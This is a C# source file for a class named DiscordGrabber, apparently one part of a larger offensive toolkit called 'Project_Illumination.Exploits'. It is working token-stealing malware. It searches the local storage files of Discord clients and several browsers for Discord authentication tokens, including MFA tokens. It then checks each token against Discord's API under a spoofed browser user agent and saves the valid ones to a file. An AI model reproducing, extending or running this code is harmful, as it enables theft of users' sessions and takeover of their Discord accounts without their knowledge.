using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Project_Illumination.Exploits.Programs
{
    class DiscordGrabber
    {
        private readonly Dictionary<string, string> _paths;
        private readonly Regex _tokenRegex;
        private readonly bool _checkTokens;
        private readonly string _file;

        // TODO: Option for MFA Tokens only
        public DiscordGrabber(bool checkTokens = true, IReadOnlyCollection<string> excludePlatforms = null)
        {
            _file = $@"{Paths.SAVE_PATH}\discord_tokens.txt";
            _checkTokens = checkTokens;
            _tokenRegex = new Regex(@"mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            _paths = new Dictionary<string, string>
            {
                { "Discord", $@"{Paths.ROAMING}\Discord" },
                { "Discord Canary", $@"{Paths.ROAMING}\discordcanary" },
                { "Discord PTB", $@"{Paths.ROAMING}\discordptb" },
                { "Google Chrome", $@"{Paths.LOCAL}\Google\Chrome\User Data\Default" },
                { "Opera", $@"{Paths.ROAMING}\Opera Software\Opera Stable" },
                { "Brave", $@"{Paths.LOCAL}\BraveSoftware\Brave-Browser\User Data\Default" },
                { "Yandex", $@"{Paths.LOCAL}\Yandex\YandexBrowser\User Data\Default" },
                { "Edge", $@"{Paths.LOCAL}\Microsoft\Edge\User Data\Default" }
            };

            if (excludePlatforms == null || excludePlatforms.Count <= 0) return;
            foreach (var excludedPlatform in excludePlatforms)
            {
                _paths.Remove(excludedPlatform);
            }
        }

        public void Run()
        {
            var tokens = new List<string>();
            Parallel.ForEach(_paths, pair =>
            {
                string platform = pair.Key, path = pair.Value;
                var tokensForPath = FindTokensForPath(path);

                if (tokensForPath.Count == 0) return;
                if (_checkTokens) tokensForPath = tokensForPath.Where(IsValidToken).ToList();

                tokensForPath.ForEach(t => tokens.Add(t));
            });

            File.WriteAllText(_file, string.Join("\n", tokens));
        }

        private bool IsValidToken(string token)
        {
            var request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v8/users/@me");
            request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0";
            request.AutomaticDecompression = DecompressionMethods.GZip;
            request.Headers.Add("Authorization", token);
            request.Timeout = 2000;

            try
            {
                using var response = (HttpWebResponse)request.GetResponse();
                return response.StatusCode == HttpStatusCode.OK;
            }
            catch
            {
                return false;
            }
        }

        private List<string> FindTokensForPath(string path)
        {
            path += @"\Local Storage\leveldb";

            var tokens = new List<string>();
            if (!Directory.Exists(path)) return tokens;

            var files = Directory.GetFiles(path).Select(Path.GetFileName).Where(fn => fn.EndsWith(".log") || fn.EndsWith(".ldb")).ToArray();
            Parallel.ForEach(files, file =>
            {
                using var stream = new FileStream($"{path}\\{file}", FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using var reader = new StreamReader(stream);

                tokens.AddRange(from Match match in _tokenRegex.Matches(reader.ReadToEnd()) select match.Value);
            });

            return tokens;
        }
    }
}
